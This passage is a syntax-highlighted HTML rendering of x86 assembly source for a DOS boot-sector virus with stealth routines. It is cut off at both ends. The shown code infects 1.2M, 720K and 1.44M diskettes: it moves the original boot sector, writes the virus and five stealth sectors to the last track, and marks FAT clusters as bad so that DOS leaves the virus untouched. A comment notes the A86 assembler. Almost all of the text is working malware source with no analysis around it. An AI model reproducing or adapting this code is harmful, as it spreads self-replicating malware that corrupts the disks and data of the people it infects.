        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5006H</span><span class="sc0">                        </span><span class="sc1">;track 80, sector 6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;BIOS write, for 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF12M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_DATA</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT_DATA</span><span class="sc0">      </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;copy boot sector disk info over</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new (viral) boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;copy drive letter there as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BOOT_START</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;set proper diskette type</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;and write viral boot sec to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">            </span><span class="sc1">;buffer for viral boot sector</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUT_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;go write it to disk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF12M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;buffer for 5 secs of stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5001H</span><span class="sc0">                        </span><span class="sc1">;track 80, sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0305H</span><span class="sc0">                        </span><span class="sc1">;write 5 sectors</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
</span><span class="sc5">INF12M_EXIT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done</span><span class="sc0">


</span><span class="sc1">;Format Track 80, Head 1 so we can infect a 1.2 Meg diskette.</span><span class="sc0">
</span><span class="sc5">FORMAT_12M</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;set drive number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5001H</span><span class="sc0">                        </span><span class="sc1">;track 80, start at sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0506H</span><span class="sc0">                        </span><span class="sc1">;format 6 sectors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FMT_12M</span><span class="sc0">               </span><span class="sc1">;format info for this sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Infect a 3 1/2" 720K drive. This process is a little different than for 5 1/4"</span><span class="sc0">
</span><span class="sc1">;drives. The virus goes in an existing data area on the disk, so no formatting</span><span class="sc0">
</span><span class="sc1">;is required. Instead, we 1) Read the boot sector and put it at Track 79, Head 1</span><span class="sc0">
</span><span class="sc1">;sector 9, 2) Put the five sectors of stealth routines at Track 79, Head 1,</span><span class="sc0">
</span><span class="sc1">;sector 4-8, 3) Put the viral boot sector at Track 0, Head 0, Sector 1, and</span><span class="sc0">
</span><span class="sc1">;4) Mark the diskette's FAT to indicate that the last three clusters are bad,</span><span class="sc0">
</span><span class="sc1">;so that DOS will not attempt to overwrite the virus code.</span><span class="sc0">

</span><span class="sc5">INFECT_720K</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;go write boot sec at</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4F09H</span><span class="sc0">                        </span><span class="sc1">;track 79, sector 9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;BIOS write, for 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF720K_EXIT</span><span class="sc0">                    </span><span class="sc1">;exit on error</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_DATA</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT_DATA</span><span class="sc0">      </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;copy boot sector disk info over</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;copy drive letter there as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BOOT_START</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;set proper diskette type</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;write new boot sector to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUT_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;go write it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF720K_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;buffer for 5 sectors of stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4F04H</span><span class="sc0">                        </span><span class="sc1">;track 79, sector 4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0305H</span><span class="sc0">                        </span><span class="sc1">;write 5 sectors</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF720K_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;now modify the FAT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">                        </span><span class="sc1">;first read 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;track 0, sector 4, head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF720K_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44</span><span class="sc0">       </span><span class="sc1">;modify the FAT in RAM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7FF7H</span><span class="sc0">                        </span><span class="sc1">;marking the last 3 clusters</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;as bad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F7FFH</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFH</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;now write the FAT back to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;at track 0, sector 4, head 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF720K_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;do second FAT too</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                            </span><span class="sc1">;at track 0, sector 7, head 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">INF720K_EXIT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine infects a 1.44 megabyte 3 1/2" diskette. It is essentially the</span><span class="sc0">
</span><span class="sc1">;same as infecting a 720K diskette, except that the virus is placed in sectors</span><span class="sc0">
</span><span class="sc1">;13-17 on Track 79, Head 0, and the original boot sector is placed in Sector 18.</span><span class="sc0">

</span><span class="sc5">INFECT_144M</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;go write boot sec at</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4F12H</span><span class="sc0">                        </span><span class="sc1">;track 79, sector 18</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;BIOS write, for 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF144M_EXIT</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_DATA</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT_DATA</span><span class="sc0">      </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;copy boot sector disk info over</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;copy drive letter there as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BOOT_START</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;set proper diskette type</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;and write new boot sector to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUT_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;go write it to disk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF144M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;buffer for 5 sectors of stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4F0DH</span><span class="sc0">                        </span><span class="sc1">;track 79, sector 13</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0305H</span><span class="sc0">                        </span><span class="sc1">;write 5 sectors</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;now modify the FAT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">                        </span><span class="sc1">;first read 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">                          </span><span class="sc1">;track 0, sector 10, head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF144M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0A8H</span><span class="sc0">     </span><span class="sc1">;modify the FAT in RAM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000FH</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF70H</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">07FF7H</span><span class="sc0">                       </span><span class="sc1">;marking the last 6 clusters</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;as bad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F7FFH</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF7FH</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF7H</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;now write the FAT back to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">                          </span><span class="sc1">;at track 0, sector 10, head 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF144M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;do second FAT too</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;at track 0, sector 1, head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">


